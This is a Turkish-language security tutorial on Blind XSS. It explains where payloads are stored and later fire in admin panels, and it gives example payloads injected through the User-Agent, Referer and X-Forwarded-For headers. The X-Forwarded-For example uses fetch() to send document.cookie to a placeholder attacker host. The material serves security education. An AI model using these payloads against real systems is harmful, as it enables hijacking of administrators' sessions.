
# Blind XSS (Kör XSS) Zafiyeti
## 1. Blind XSS Nedir?
Blind XSS (Kör XSS), uygulamanın kullanıcıdan aldığı girdiyi anında ekrana yansıtmadığı, ancak arka planda (veritabanı, log dosyaları vb.) saklayıp daha sonra başka bir kullanıcıya (genellikle yetkili bir sistem yöneticisine) gösterdiği durumlarda ortaya çıkan sinsi bir **Stored XSS** türüdür.

* **Karakteristiği:** Adından da anlaşılacağı gibi saldırgan "kördür". Gönderdiği zararlı kodun çalışıp çalışmadığını, ne zaman çalışacağını veya kimde çalışacağını o an göremez. 
* **Hedef:** Asıl amaç normal kullanıcılar değil, gönderilen verileri okuyan **Sistem Yöneticileri (Admin), Destek Ekipleri veya Moderatörlerdir.** Yönetici panellerinde çalışan bu scriptler, admin oturumlarının (session) çalınmasına veya sunucuda komut çalıştırılmasına yol açar.

---

## 2. Sık Karşılaşılan Enjeksiyon Noktaları
Saldırganlar, verilerin arka planda bir insan tarafından okunacağını bildikleri her form alanını Blind XSS için test ederler:

* **İletişim ve Destek Talebi Formları:** "Bize Ulaşın" kısımları genellikle müşteri temsilcileri veya destek ekipleri tarafından özel bir panelde okunur.
* **Ürün Değerlendirmeleri ve Yorumlar:** Onay bekleyen yorumlar moderatör panelinde listelenirken tetiklenebilir.
* **Kullanıcı Profil ve Sipariş Alanları:** "Teslimat Adresi" veya "Hakkımda" kısmına yazılan kodlar, kargolama/faturalama departmanının ekranında patlayabilir.
* **Anketler ve Geri Bildirim Formları:** Toplanan veriler yöneticilerin raporlama ekranlarında çalışabilir.

---

## 3. HTTP Başlıkları (Headers) Üzerinden Blind XSS
Web uygulamaları genellikle loglama, istatistik ve güvenlik analizi için kullanıcıların HTTP başlıklarını kaydeder. Geliştiriciler bu başlıkların "kullanıcı tarafından değiştirilemeyeceğini" varsayarak filtrelemeden panelde ekrana basarsa, Blind XSS tetiklenir.

Saldırganların proxy araçlarıyla (örn: Burp Suite) araya girip değiştirdiği popüler HTTP başlıkları şunlardır:

### A. User-Agent Header'ı
Kullanıcının tarayıcı ve işletim sistemi bilgisini tutar. Log analiz ekranlarında yöneticilere gösterilir.

```http
User-Agent: Mozilla/5.0 <script>alert('XSS - Admin Paneli Ele Geçirildi!')</script>
````

### B. Referer Header'ı

Kullanıcının o siteye hangi linkten (kaynaktan) tıklayarak geldiğini belirtir.

```HTTP
Referer: [http://other-site.com](http://other-site.com) <script>alert('XSS')</script>
```

### C. X-Forwarded-For Header'ı

Kullanıcı bir proxy veya yük dengeleyici (Load Balancer) arkasındaysa, gerçek IP adresini belirtmek için kullanılır. IP loglarını inceleyen yöneticileri hedefler.

```http
X-Forwarded-For: 198.51.100.15 <script>fetch('[http://saldırgan.com/log?cookie=](http://saldırgan.com/log?cookie=)' + document.cookie)</script>
```